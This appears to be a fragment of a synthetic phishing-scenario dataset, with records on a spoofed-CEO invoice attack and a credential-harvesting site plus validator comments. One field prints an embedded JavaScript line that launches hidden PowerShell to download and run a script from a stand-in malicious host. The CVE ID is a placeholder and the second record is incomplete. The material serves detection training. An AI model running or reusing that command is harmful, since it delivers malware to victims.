technical_data.url_obfuscation: Subdomain and domain concatenation to mimic official invoice URL, using dash and dot to confuse users (company-secure.com.invoice-payments.com)

attachment_analysis.embedded_js: var shell = new ActiveXObject('WScript.Shell'); shell.Run('powershell -nop -w hidden -c "iex ((New-Object Net.WebClient).DownloadString('http://malicious-server.com/payload.ps1'))"');
attachment_analysis.embedded_object: JS embedded in PDF exploiting CVE-2022-XYZ for remote code execution

indicators: Suspicious domain registration with privacy protection and recent creation
Email From header spoofed to CEO domain, but actual sending IP external and not part of known mail servers
Attachment contains embedded JavaScript launching PowerShell downloads
URL uses subdomain obfuscation to mimic legitimate invoice payment portal
SPF and DKIM pass due to attacker controlling the spoofed domain
example.detection_method: Email gateway with advanced attachment sandboxing detects embedded JS and suspicious PowerShell command execution. Threat intelligence flagged domain 'company-secure.com.invoice-payments.com' as newly registered and used in recent phishing campaigns. Endpoint detection identifies PowerShell execution with encoded commands. User training identifies mismatch in usual communication style and verifies with CEO by phone.

validation.comments: The sample accurately represents a spear phishing attack scenario targeting a CFO with a malicious invoice attachment and a spoofed CEO email address. It aligns well with the problem nature by demonstrating a highly targeted phishing email crafted using personal information (targeting the CFO, spoofing the CEO). The technical data is comprehensive and realistic, including detailed email headers, body, SMTP logs, domain registration info, malicious URL with obfuscation, and attachment analysis showing embedded malicious JavaScript exploiting a known CVE. The indicators clearly explain why this is a spear phishing attack, highlighting suspicious domain registration, spoofed headers, malicious attachment behavior, URL obfuscation, and attacker control of the spoofed domain allowing SPF/DKIM pass. The detection methods cover multiple layers including email gateway sandboxing, threat intelligence, endpoint detection, and user training, which aligns with recommended risk reduction strategies. All required fields are present and accurately populated, and relevant MITRE ATT&CK techniques are correctly referenced. Overall, this is a well-constructed, realistic, and complete example that effectively illustrates the stated cybersecurity problem.

Web proxy logs show unusual access to URL with Unicode characters. User reports prompt investigation revealing credential harvesting form. Endpoint logs show credential POST to suspicious domain.

The scenario is realistic, reflecting common real-world tactics like SPF failure, suspicious domain registration with privacy protection, and a credential harvesting site mimicking a legitimate login page. All required fields are present and populated with detailed, coherent data including email headers, SMTP logs, domain registration info, URL details, webserver logs, and phishing site artifacts. The indicators clearly explain why this sample matches the spear phishing problem, highlighting the use of homoglyphs, SPF failure, URL obfuscation, suspicious IP origin, and credential capture. Detection methods and relevant MITRE ATT&CK techniques are appropriately referenced, supporting the scenario's validity. Overall, the sample is comprehensive, technically sound, and suitable for illustrating spear phishing risk and mitigation.
